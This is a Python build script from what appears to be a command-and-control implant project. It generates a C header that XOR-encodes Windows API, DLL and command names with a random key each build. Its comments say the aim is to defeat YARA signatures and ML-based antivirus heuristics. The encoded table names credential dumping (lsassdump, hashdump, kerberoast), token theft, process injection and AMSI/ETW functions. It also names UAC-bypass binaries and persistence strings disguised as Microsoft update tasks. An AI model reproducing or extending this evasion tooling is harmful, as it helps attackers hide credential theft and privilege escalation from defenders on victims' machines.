#!/usr/bin/env python3
"""
Generate agent/include/evs_strings.h — per-build random XOR key for all
API / DLL name obfuscation arrays.  Replaces the hardcoded 0xba constant
that was a static YARA signature.

Run: python tools/gen_evs_strings.py
Called automatically by: make config
"""
import os
import secrets

# ── Master string table ────────────────────────────────────────────────────
# name → C identifier suffix (EVS_<suffix>)
STRINGS = {
    # DLL names
    "ntdll.dll":         "dll_ntdll",
    "kernel32.dll":      "dll_kernel32",
    "kernelbase.dll":    "dll_kernelbase",
    "xpsservices.dll":   "dll_xpsservices",
    "advapi32.dll":      "dll_advapi32",
    "amsi.dll":          "dll_amsi",
    "secur32.dll":       "dll_secur32",
    "netapi32.dll":      "dll_netapi32",
    "winhttp.dll":       "dll_winhttp",
    "gdi32.dll":         "dll_gdi32",
    "user32.dll":        "dll_user32",

    # Nt* syscall names (ntdll)
    "NtOpenProcess":              "fn_NtOpenProcess",
    "NtAllocateVirtualMemory":    "fn_NtAllocateVirtualMemory",
    "NtWriteVirtualMemory":       "fn_NtWriteVirtualMemory",
    "NtProtectVirtualMemory":     "fn_NtProtectVirtualMemory",
    "NtCreateThreadEx":           "fn_NtCreateThreadEx",
    "NtClose":                    "fn_NtClose",
    "NtOpenThread":               "fn_NtOpenThread",
    "NtSuspendThread":            "fn_NtSuspendThread",
    "NtResumeThread":             "fn_NtResumeThread",
    "NtGetContextThread":         "fn_NtGetContextThread",
    "NtSetContextThread":         "fn_NtSetContextThread",
    "NtQueueApcThread":           "fn_NtQueueApcThread",
    "NtCreateSection":            "fn_NtCreateSection",
    "NtMapViewOfSection":         "fn_NtMapViewOfSection",
    "NtUnmapViewOfSection":       "fn_NtUnmapViewOfSection",
    "NtReadVirtualMemory":        "fn_NtReadVirtualMemory",
    "NtQueryInformationProcess":  "fn_NtQueryInformationProcess",
    "NtContinue":                 "fn_NtContinue",
    "NtWaitForSingleObject":      "fn_NtWaitForSingleObject",

    # ntdll helpers / ETW
    "RtlCaptureContext":          "fn_RtlCaptureContext",
    "RtlUserThreadStart":         "fn_RtlUserThreadStart",
    "EtwEventWrite":              "fn_EtwEventWrite",
    "EtwTiLogOpenProcess":        "fn_EtwTiLogOpenProcess",
    "EtwTiLogReadWriteVm":        "fn_EtwTiLogReadWriteVm",
    "EtwTiLogDuplicateHandle":    "fn_EtwTiLogDuplicateHandle",

    # AMSI (amsi.dll)
    "AmsiScanBuffer":             "fn_AmsiScanBuffer",
    "AmsiScanString":             "fn_AmsiScanString",

    # advapi32.dll
    "AdjustTokenPrivileges":      "fn_AdjustTokenPrivileges",
    "DuplicateTokenEx":           "fn_DuplicateTokenEx",
    "ImpersonateLoggedOnUser":    "fn_ImpersonateLoggedOnUser",
    "LogonUserA":                 "fn_LogonUserA",
    "LookupPrivilegeNameA":       "fn_LookupPrivilegeNameA",
    "LookupPrivilegeValueA":      "fn_LookupPrivilegeValueA",
    "OpenProcessToken":           "fn_OpenProcessToken",
    "OpenThreadToken":            "fn_OpenThreadToken",
    "RevertToSelf":               "fn_RevertToSelf",
    "CloseServiceHandle":         "fn_CloseServiceHandle",
    "EnumServicesStatusExA":      "fn_EnumServicesStatusExA",
    "OpenSCManagerA":             "fn_OpenSCManagerA",
    "OpenServiceA":               "fn_OpenServiceA",
    "QueryServiceConfigA":        "fn_QueryServiceConfigA",
    "RegisterServiceCtrlHandlerA":"fn_RegisterServiceCtrlHandlerA",
    "SetServiceStatus":           "fn_SetServiceStatus",
    "StartServiceCtrlDispatcherA":"fn_StartServiceCtrlDispatcherA",
    "RegDeleteTreeA":             "fn_RegDeleteTreeA",
    "GetTokenInformation":        "fn_GetTokenInformation",
    "SetThreadToken":             "fn_SetThreadToken",
    "PrivilegeCheck":             "fn_PrivilegeCheck",
    "AllocateAndInitializeSid":   "fn_AllocateAndInitializeSid",
    "EqualSid":                   "fn_EqualSid",
    "FreeSid":                    "fn_FreeSid",
    "ImpersonateNamedPipeClient": "fn_ImpersonateNamedPipeClient",
    "CreateProcessWithTokenW":    "fn_CreateProcessWithTokenW",
    "CreateProcessAsUserW":       "fn_CreateProcessAsUserW",
    "CredEnumerateA":             "fn_CredEnumerateA",
    "CredFree":                   "fn_CredFree",

    # kernel32.dll
    "InitializeProcThreadAttributeList": "fn_InitializeProcThreadAttributeList",
    "UpdateProcThreadAttribute":         "fn_UpdateProcThreadAttribute",
    "DeleteProcThreadAttributeList":     "fn_DeleteProcThreadAttributeList",
    "ResumeThread":               "fn_ResumeThread",
    "GetComputerNameA":           "fn_GetComputerNameA",
    "GetComputerNameW":           "fn_GetComputerNameW",
    "GetComputerNameExW":         "fn_GetComputerNameExW",
    "GetNativeSystemInfo":        "fn_GetNativeSystemInfo",
    "GlobalMemoryStatusEx":       "fn_GlobalMemoryStatusEx",
    "VirtualProtect":             "fn_VirtualProtect",
    "Sleep":                      "fn_Sleep",
    "SetEvent":                   "fn_SetEvent",
    "GetThreadContext":           "fn_GetThreadContext",
    "SetThreadContext":           "fn_SetThreadContext",
    "MapViewOfFile":              "fn_MapViewOfFile",
    "UnmapViewOfFile":            "fn_UnmapViewOfFile",
    "AddVectoredExceptionHandler":"fn_AddVectoredExceptionHandler",
    "CreateNamedPipeA":           "fn_CreateNamedPipeA",
    "ConnectNamedPipe":           "fn_ConnectNamedPipe",
    "IsWow64Process":             "fn_IsWow64Process",
    "RtlGetVersion":              "fn_RtlGetVersion",

    # winspool.drv
    "winspool.drv":               "dll_winspool",
    "OpenPrinterW":               "fn_OpenPrinterW",
    "ClosePrinter":               "fn_ClosePrinter",

    # shell32.dll
    "shell32.dll":                "dll_shell32",
    "ShellExecuteExW":            "fn_ShellExecuteExW",
    "ShellExecuteExA":            "fn_ShellExecuteExA",
    "CheckTokenMembership":       "fn_CheckTokenMembership",

    # mscoree.dll
    "mscoree.dll":                "dll_mscoree",
    "CorBindToRuntimeEx":         "fn_CorBindToRuntimeEx",

    # advapi32 extra
    "RegDeleteKeyA":              "fn_RegDeleteKeyA",
    "RegCreateKeyExA":            "fn_RegCreateKeyExA",
    "RegSetValueExA":             "fn_RegSetValueExA",
    "RegCloseKey":                "fn_RegCloseKey",

    # secur32.dll
    "LsaConnectUntrusted":           "fn_LsaConnectUntrusted",
    "LsaLookupAuthenticationPackage":"fn_LsaLookupAuthenticationPackage",
    "LsaCallAuthenticationPackage":  "fn_LsaCallAuthenticationPackage",
    "LsaFreeReturnBuffer":           "fn_LsaFreeReturnBuffer",

    # netapi32.dll
    "DsGetDcNameW":               "fn_DsGetDcNameW",

    # winhttp.dll
    "WinHttpCrackUrl":            "fn_WinHttpCrackUrl",
    "WinHttpOpen":                "fn_WinHttpOpen",
    "WinHttpConnect":             "fn_WinHttpConnect",
    "WinHttpOpenRequest":         "fn_WinHttpOpenRequest",
    "WinHttpSetOption":           "fn_WinHttpSetOption",
    "WinHttpAddRequestHeaders":   "fn_WinHttpAddRequestHeaders",
    "WinHttpSetTimeouts":         "fn_WinHttpSetTimeouts",
    "WinHttpSendRequest":         "fn_WinHttpSendRequest",
    "WinHttpReceiveResponse":     "fn_WinHttpReceiveResponse",
    "WinHttpQueryOption":         "fn_WinHttpQueryOption",
    "WinHttpQueryDataAvailable":  "fn_WinHttpQueryDataAvailable",
    "WinHttpReadData":            "fn_WinHttpReadData",
    "WinHttpCloseHandle":         "fn_WinHttpCloseHandle",

    # gdi32.dll
    "GetDeviceCaps":              "fn_GetDeviceCaps",
    "CreateCompatibleDC":         "fn_CreateCompatibleDC",
    "CreateCompatibleBitmap":     "fn_CreateCompatibleBitmap",
    "SelectObject":               "fn_SelectObject",
    "BitBlt":                     "fn_BitBlt",
    "StretchBlt":                 "fn_StretchBlt",
    "DeleteDC":                   "fn_DeleteDC",
    "DeleteObject":               "fn_DeleteObject",
    "GetStockObject":             "fn_GetStockObject",
    "SetStretchBltMode":          "fn_SetStretchBltMode",
    "SetBrushOrgEx":              "fn_SetBrushOrgEx",
    "GetDIBits":                  "fn_GetDIBits",

    # user32.dll
    "GetDC":                      "fn_GetDC",
    "ReleaseDC":                  "fn_ReleaseDC",

    # BOF Beacon API names
    "Beacon":                     "str_Beacon",
    "BeaconPrintf":               "str_BeaconPrintf",
    "BeaconOutput":               "str_BeaconOutput",
    "BeaconIsAdmin":              "str_BeaconIsAdmin",
    "BeaconDataParse":            "str_BeaconDataParse",
    "BeaconDataExtract":          "str_BeaconDataExtract",
    "BeaconDataInt":              "str_BeaconDataInt",
    "BeaconDataShort":            "str_BeaconDataShort",
    "BeaconDataLength":           "str_BeaconDataLength",

    # process names
    "winlogon.exe":               "str_winlogon_exe",
    "services.exe":               "str_services_exe",
    "spoolsv.exe":                "str_spoolsv_exe",
    "svchost.exe":                "str_svchost_exe",
    "lsass.exe":                  "str_lsass_exe",
    "RuntimeBroker.exe":          "str_RuntimeBroker_exe",
    "dllhost.exe":                "str_dllhost_exe",
    "explorer.exe":               "str_explorer_exe",

    # WMI class name
    "Win32_Process":              "str_Win32_Process",

    # UAC elevation moniker (stored as bytes; decoded as WCHAR in uac.c)
    "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}":
        "str_elevation_moniker",

    # Privilege names — decoded at runtime only where needed
    "SeDebugPrivilege":           "str_SeDebugPrivilege",
    "SeImpersonatePrivilege":     "str_SeImpersonatePrivilege",
    "SeAssignPrimaryTokenPrivilege": "str_SeAssignPrimaryTokenPrivilege",
    "SeIncreaseQuotaPrivilege":  "str_SeIncreaseQuotaPrivilege",

    # Command dispatch names — kept encoded so plaintext never appears in .rdata
    "lsassdump":                  "str_cmd_lsassdump",
    "kerberoast":                 "str_cmd_kerberoast",
    "asreproast":                 "str_cmd_asreproast",
    "steal_token":                "str_cmd_steal_token",
    "hashdump":                   "str_cmd_hashdump",
    "getsystem":                  "str_cmd_getsystem",
    "uacbypass":                  "str_cmd_uacbypass",
    "inject":                     "str_cmd_inject",
    "privesc":                    "str_cmd_privesc",
    "shinject":                   "str_cmd_shinject",
    "execute-assembly":           "str_cmd_execasm",
    "bof":                        "str_cmd_bof",

    # Registry paths used in getsystem / uac — offensive fingerprint
    "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer": "str_reg_installer_policy",
    "AlwaysInstallElevated":      "str_AlwaysInstallElevated",
    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System": "str_reg_policies_system",
    "ConsentPromptBehaviorAdmin": "str_ConsentPromptBehaviorAdmin",

    # UAC bypass operational strings — YARA triggers
    "ms-settings":                "str_ms_settings",
    "DelegateExecute":            "str_DelegateExecute",
    "exefile":                    "str_exefile",
    "mscfile":                    "str_mscfile",
    "AppX3xxs313wwkfjhythsb8q46xdssgfr0": "str_wsreset_clsid",
    "fodhelper.exe":              "str_fodhelper_exe",
    "computerdefaults.exe":       "str_computerdefaults_exe",
    "wsreset.exe":                "str_wsreset_exe",
    "sdclt.exe":                  "str_sdclt_exe",
    "eventvwr.exe":               "str_eventvwr_exe",
    "schtasks.exe":               "str_schtasks_exe",
    "lifter.exe":                 "str_lifter_exe",
    "WinMgmt":                    "str_WinMgmt",
    "Environment":                "str_Environment",
    "windir":                     "str_windir",
    "SilentCleanup":              "str_SilentCleanup",

    # Persistence masquerade strings
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run": "str_reg_run_key",
    "MicrosoftUpdateService":     "str_persist_reg_val",
    "Microsoft Corporation":      "str_persist_author",
    "LogonTrigger":               "str_persist_trigger_id",
    "MicrosoftEdgeUpdateTaskMachineCore": "str_persist_task_name",
}


def main():
    key = secrets.randbelow(256)
    while key == 0:          # avoid 0 — XOR identity gives plaintext
        key = secrets.randbelow(256)

    lines = [
        "/* AUTO-GENERATED by tools/gen_evs_strings.py — do not edit.",
        " * EVS_KEY is randomised every build; all byte arrays change.",
        " * Defeats static YARA rules that match encoded API/DLL names.",
        " */",
        "#ifndef EVS_STRINGS_H",
        "#define EVS_STRINGS_H",
        "",
        f"#define EVS_KEY 0x{key:02x}u",
        "",
    ]

    prev_group = None
    for plaintext, suffix in STRINGS.items():
        group = suffix.split("_")[0]   # "dll", "fn", or "str"
        if group != prev_group:
            labels = {"dll": "DLL names", "fn": "API / function names",
                      "str": "Misc strings"}
            lines.append(f"/* --- {labels.get(group, group)} --- */")
            prev_group = group

        enc = [b ^ key for b in plaintext.encode("latin-1")]
        arr = ", ".join(f"0x{b:02x}" for b in enc)
        lines.append(
            f"static const unsigned char EVS_{suffix}[{len(enc)}]"
            f" = {{ {arr} }};  /* {plaintext} */"
        )

    lines += [
        "",
        "/* Single XOR-decode helper — one definition in src/evs.c, called everywhere.",
        " * Replaces 100+ identical inline loops that trigger ML-based heuristics. */",
        "#ifndef _EVS_DEC_DECL",
        "#define _EVS_DEC_DECL",
        "#include <stddef.h>",
        "extern void _evs_dec(char *out, const unsigned char *enc, size_t n);",
        "#define EVS_D(out, arr) _evs_dec((out), (arr), sizeof(arr))",
        "#endif",
        "",
        "#endif /* EVS_STRINGS_H */",
        "",
    ]

    out_path = os.path.join(
        os.path.dirname(__file__), "..", "include", "evs_strings.h"
    )
    with open(out_path, "w") as f:
        f.write("\n".join(lines))

    print(f"[ok] wrote {out_path}  (EVS_KEY=0x{key:02x})")
    print(f"     {len(STRINGS)} strings encoded")


if __name__ == "__main__":
    main()
